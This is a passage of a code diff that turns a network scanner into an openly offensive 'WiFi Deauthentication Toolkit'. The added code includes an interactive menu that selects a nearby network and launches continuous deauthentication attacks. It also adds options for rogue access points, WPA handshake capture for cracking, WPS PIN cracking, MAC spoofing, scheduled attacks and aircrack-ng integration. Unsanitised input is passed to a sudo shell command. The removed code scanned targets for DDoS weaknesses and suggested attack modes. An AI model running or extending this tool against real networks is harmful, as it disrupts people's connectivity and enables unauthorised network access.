+    """Integrate with tshark for advanced packet analysis."""
+    print(f"{Fore.YELLOW}[*] Running tshark on interface {interface}...{Style.RESET_ALL}")
+    try:
+        os.system(f"sudo tshark -i {interface} -f '{filter}'")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error running tshark: {e}{Style.RESET_ALL}")
+
+def interactive_mode(interface):
+    """Interactive mode for scanning and deauthentication."""
+    print(f"{Fore.YELLOW}[*] Entering interactive mode...{Style.RESET_ALL}")
+    while True:
+        print(f"\n{Fore.CYAN}Interactive Mode Menu:{Style.RESET_ALL}")
+        print("1. Scan Networks")
+        print("2. Exit")
+
+        try:
+            choice = int(input(f"{Fore.YELLOW}[*] Select an option (1-2): {Style.RESET_ALL}"))
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input. Please enter a number.{Style.RESET_ALL}")
+            continue
+
+        if choice == 1:
+            networks = wifi_scan(interface)
+            if not networks:
+                print(f"{Fore.RED}[!] No networks found.{Style.RESET_ALL}")
+                continue
+            print_networks(networks)
+
+            # After scanning, ask if the user wants to deauthenticate
+            try:
+                deauth_choice = input(f"{Fore.YELLOW}[*] Do you want to deauthenticate a network? (y/n): {Style.RESET_ALL}").lower()
+                if deauth_choice == 'y':
+                    try:
+                        network_choice = int(input(f"{Fore.YELLOW}[*] Select a network to attack (1-{len(networks)}): {Style.RESET_ALL}"))
+                        if network_choice < 1 or network_choice > len(networks):
+                            print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
+                            continue
+                        selected_network = networks[network_choice - 1]
+                        print(f"{Fore.YELLOW}[*] Selected network: SSID: {selected_network[0]}, BSSID: {selected_network[1]}, Channel: {selected_network[2]}{Style.RESET_ALL}")
+                        deauth_attack(interface, selected_network[1], continuous=True)
+                    except ValueError:
+                        print(f"{Fore.RED}[!] Invalid input.{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
+
+        elif choice == 2:
+            print(f"{Fore.YELLOW}[*] Exiting interactive mode...{Style.RESET_ALL}")
+            break
+
+        else:
+            print(f"{Fore.RED}[!] Invalid choice. Please select a valid option.{Style.RESET_ALL}")
+
+def main():
+    global interface
+    print(BANNER)  # Display banner
+
+    # Argument parsing
+    parser = argparse.ArgumentParser(description="WiFi Deauthentication Toolkit")
+    parser.add_argument("interface", help="Wireless interface to use (e.g., wlan0)")
+    parser.add_argument("-i", "--interactive", action="store_true", help="Enter interactive mode")
+    parser.add_argument("--spoof-mac", type=str, help="Spoof the MAC address of the wireless interface")
+    parser.add_argument("--inject-packet", action="store_true", help="Inject a custom packet into the network")
+    parser.add_argument("--capture-handshake", type=str, help="Capture WPA handshake for offline cracking (provide BSSID)")
+    parser.add_argument("--list-clients", type=str, help="List clients connected to a specific AP (provide BSSID)")
+    parser.add_argument("--create-rogue-ap", nargs=2, metavar=("SSID", "CHANNEL"), help="Create a rogue access point")
+    parser.add_argument("--crack-wps", type=str, help="Attempt to crack the WPS PIN of a vulnerable router (provide BSSID)")
+    parser.add_argument("--packet-sniff", type=str, help="Sniff packets on a specific interface (optional: provide MAC address to filter)")
+    parser.add_argument("--network-stats", action="store_true", help="Display real-time network statistics")
+    parser.add_argument("--craft-packet", action="store_true", help="Craft a custom packet")
+    parser.add_argument("--automated-attack", type=str, help="Run an automated attack script (provide BSSID)")
+    parser.add_argument("--save-config", type=str, help="Save the current configuration to a file")
+    parser.add_argument("--load-config", type=str, help="Load a configuration from a file")
+    parser.add_argument("--wifi-map", action="store_true", help="Create a visual map of nearby WiFi networks")
+    parser.add_argument("--detect-isolation", type=str, help="Detect if client isolation is enabled on a network (provide BSSID)")
+    parser.add_argument("--discover-hidden", action="store_true", help="Discover hidden SSIDs by analyzing probe requests and responses")
+    parser.add_argument("--time-based-attack", nargs=3, metavar=("BSSID", "START_TIME", "DURATION"), help="Schedule a deauthentication attack to run at a specific time")
+    parser.add_argument("--signal-strength", type=str, help="Visualize signal strength over time for a specific network or client (provide BSSID)")
+    parser.add_argument("--generate-report", type=str, help="Generate a detailed report in HTML format")
+    parser.add_argument("--aircrack", nargs=2, metavar=("BSSID", "WORDLIST"), help="Integrate with aircrack-ng for WEP/WPA cracking")
+    parser.add_argument("--tshark", type=str, help="Integrate with tshark for advanced packet analysis (provide filter)")
+    parser.add_argument("--help-menu", action="store_true", help="Display help information")
+
     args = parser.parse_args()
 
+    # Check for root privileges
+    check_root()
+
+    interface = args.interface
+    set_monitor_mode(interface)
+
+    # Register the signal handler for Ctrl+C
+    signal.signal(signal.SIGINT, signal_handler)
+
     if args.interactive:
-        interactive_mode()
-        return
+        interactive_mode(interface)
+    else:
+        # Normal mode: Handle other command-line arguments
+        if args.spoof_mac:
+            spoof_mac(interface, args.spoof_mac)
 
-    if args.multiple:
-        targets = args.multiple
-        logger.info(f"Scanning multiple targets: {targets}")
-        for target in targets:
-            ip = resolve_domain_to_ip(target) if not target.replace(".", "").isdigit() else target
-            if not ip:
-                logger.error(f"Invalid target: {target}")
-                continue
+        if args.inject_packet:
+            packet = craft_packet()
+            if packet:
+                inject_packet(interface, packet)
 
-            logger.info(f"Scanning target IP: {ip} for vulnerabilities")
-            run_nmap_scan(ip)
-            firewall_detected = detect_firewall(ip)
-            scan_results = scan_for_ddos_vulnerabilities(ip)
-            http_https_scan = scan_http_https(ip)
+        if args.capture_handshake:
+            capture_handshake(interface, args.capture_handshake, "handshake")
 
-            logger.info("Scan Report:")
-            print_scan_report(scan_results)
+        if args.list_clients:
+            list_connected_clients(interface, args.list_clients)
 
-            # Analyze scan results and suggest attack mode
-            suggestions = analyze_scan_results(scan_results)
-            print_suggestions(suggestions)
+        if args.create_rogue_ap:
+            create_rogue_ap(interface, args.create_rogue_ap[0], int(args.create_rogue_ap[1]))
 
-            # Generate unique filenames based on IP and timestamp
-            timestamp = time.strftime("%Y%m%d_%H%M%S")
-            html_filename = f"scan_report_{ip}_{timestamp}.html"
-            json_filename = f"scan_results_{ip}_{timestamp}.json"
+        if args.crack_wps:
+            crack_wps_pin(interface, args.crack_wps)
 
-            # Generate and save HTML report
-            generate_html_report(scan_results, html_filename)
+        if args.packet_sniff:
+            packet_sniff(interface, args.packet_sniff)
 
-            # Save scan results to JSON
-            save_scan_results_to_json(scan_results, json_filename)
-        return
+        if args.network_stats:
+            network_stats(interface)
 
-    target = args.target
-    ip = resolve_domain_to_ip(target) if not target.replace(".", "").isdigit() else target
+        if args.craft_packet:
+            packet = craft_packet()
+            if packet:
+                inject_packet(interface, packet)
 
-    if not ip:
-        logger.error("Invalid target.")
-        return
+        if args.automated_attack:
+            automated_attack(interface, args.automated_attack)
 
-    logger.info(f"Scanning target IP: {ip} for vulnerabilities")
+        if args.save_config:
+            config = {"interface": interface, "scan_time": SCAN_TIME}
+            save_config(config, args.save_config)
 
-    # Run Nmap scan
-    run_nmap_scan(ip)
+        if args.load_config:
+            config = load_config(args.load_config)
+            if config:
+                interface = config.get("interface", interface)
+                SCAN_TIME = config.get("scan_time", SCAN_TIME)
 
-    # Detect firewall
-    firewall_detected = detect_firewall(ip)
+        if args.wifi_map:
+            wifi_network_map(interface)
 
-    # Scan for DDoS vulnerabilities
-    scan_results = scan_for_ddos_vulnerabilities(ip)
-    http_https_scan = scan_http_https(ip)
+        if args.detect_isolation:
+            detect_client_isolation(interface, args.detect_isolation)
 
-    # Print scan report
-    logger.info("Scan Report:")
-    print_scan_report(scan_results)
+        if args.discover_hidden:
+            discover_hidden_ssids(interface)
 
-    # Analyze scan results and suggest attack mode
-    suggestions = analyze_scan_results(scan_results)
-    print_suggestions(suggestions)
+        if args.time_based_attack:
+            time_based_attack(interface, args.time_based_attack[0], args.time_based_attack[1], int(args.time_based_attack[2]))
 
-    # Generate unique filenames based on IP and timestamp
-    timestamp = time.strftime("%Y%m%d_%H%M%S")
-    html_filename = f"scan_report_{ip}_{timestamp}.html"
-    json_filename = f"scan_results_{ip}_{timestamp}.json"
+        if args.signal_strength:
+            signal_strength_visualization(interface, args.signal_strength)
 
-    # Generate and save HTML report
-    generate_html_report(scan_results, html_filename)
+        if args.generate_report:
+            generate_report(args.generate_report)
 
-    # Save scan results to JSON
-    save_scan_results_to_json(scan_results, json_filename)
+        if args.aircrack:
+            integrate_aircrack(interface, args.aircrack[0], args.aircrack[1])
 
-    # Additional features
-    if args.sniff:
-        sniff_packets(ip, save_pcap=True)
+        if args.tshark:
+            integrate_tshark(interface, args.tshark)
 
-    if args.analyze:
-        analyze_headers(f"http://{ip}")
+        if args.help_menu:
+            help()
+
+    # Reset the interface to managed mode
+    reset_interface(interface)
 
 if __name__ == "__main__":
-    asyncio.run(main_async())
-
-# Configure logging
-logging.basicConfig(filename='network_analysis.log', level=logging.INFO, format='%(asctime)s - %(message)s')
-
-def sniff_packets(target_ip, save_pcap=False):
-    print(f"{Fore.GREEN}Starting packet sniffing on {target_ip}...{Style.RESET_ALL}")
-    
-    def packet_callback(packet):
-        if packet.haslayer(scapy.IP):
-            src_ip = packet[scapy.IP].src
-            dst_ip = packet[scapy.IP].dst
-            protocol = packet[scapy.IP].proto
-            print(f"{Fore.BLUE}Packet: {src_ip} -> {dst_ip} Protocol: {protocol}{Style.RESET_ALL}")
-            
-            # Deep Packet Inspection for HTTP
-            if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
-                payload = packet[scapy.Raw].load
-                if b"HTTP" in payload:
-                    print(f"{Fore.YELLOW}HTTP Payload: {payload}{Style.RESET_ALL}")
-    
-    if save_pcap:
-        scapy.sniff(filter=f"host {target_ip}", prn=packet_callback, count=100, store=True)
-        scapy.wrpcap(f"capture_{target_ip}.pcap", scapy.sniffed)
-    else:
-        scapy.sniff(filter=f"host {target_ip}", prn=packet_callback, count=100)
-
-def analyze_headers(url):
-    print(f"{Fore.GREEN}Analyzing HTTP headers for {url}...{Style.RESET_ALL}")
-    
-    try:
-        response = requests.get(url)
-        headers = response.headers
-        
-        print(f"{Fore.BLUE}HTTP Headers:{Style.RESET_ALL}")
-        for header, value in headers.items():
-            print(f"{header}: {value}")
-        
-        # Check for common security headers
-        security_headers = {
-            "Strict-Transport-Security": "Missing",
-            "Content-Security-Policy": "Missing",
-            "X-Content-Type-Options": "Missing",
-            "X-Frame-Options": "Missing",
-            "X-XSS-Protection": "Missing",
-        }
-        
-        for header in security_headers:
-            if header in headers:
-                security_headers[header] = "Present"
-        
-        print(f"\n{Fore.BLUE}Security Headers Analysis:{Style.RESET_ALL}")
-        for header, status in security_headers.items():
-            print(f"{header}: {status}")
-        
-        # Analyze cookies
-        if 'Set-Cookie' in headers:
-            cookies = headers['Set-Cookie'].split(',')
-            print(f"\n{Fore.BLUE}Cookie Analysis:{Style.RESET_ALL}")
-            for cookie in cookies:
-                print(f"Cookie: {cookie}")
-                if 'HttpOnly' in cookie:
-                    print("  HttpOnly: Yes")
-                if 'Secure' in cookie:
-                    print("  Secure: Yes")
-                if 'SameSite' in cookie:
-                    print(f"  SameSite: {cookie.split('SameSite=')[1].split(';')[0]}")
-    
-    except requests.RequestException as e:
-        print(f"{Fore.RED}Error analyzing headers: {e}{Style.RESET_ALL}")
-        logging.error(f"Error analyzing headers for {url}: {e}")
-
-def port_scan(target_ip, ports):
-    print(f"{Fore.GREEN}Scanning ports on {target_ip}...{Style.RESET_ALL}")
-    open_ports = []
-
-    def scan_port(port):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            result = sock.connect_ex((target_ip, port))
-            if result == 0:
-                open_ports.append(port)
-                print(f"{Fore.GREEN}Port {port} is open{Style.RESET_ALL}")
-            sock.close()
-        except socket.error as e:
-            print(f"{Fore.RED}Error scanning port {port}: {e}{Style.RESET_ALL}")
-            logging.error(f"Error scanning port {port} on {target_ip}: {e}")
-
-    threads = []
-    for port in ports:
-        thread = threading.Thread(target=scan_port, args=(port,))
-        threads.append(thread)
-        thread.start()
-
-    for thread in threads:
-        thread.join()
-
-    print(f"\n{Fore.BLUE}Open ports: {open_ports}{Style.RESET_ALL}")
-
-def generate_html_report(data, filename="report.html"):
-    print(f"{Fore.GREEN}Generating HTML report...{Style.RESET_ALL}")
-    with open(filename, "w") as f:
-        f.write("<html><body>")
-        f.write("<h1>Network Analysis Report</h1>")
-        f.write(f"<p>Generated on: {datetime.now()}</p>")
-        f.write("<h2>Packet Sniffing Results</h2>")
-        f.write(f"<pre>{json.dumps(data, indent=4)}</pre>")
-        f.write("</body></html>")
-    print(f"{Fore.GREEN}Report saved to {filename}{Style.RESET_ALL}")
+    main()
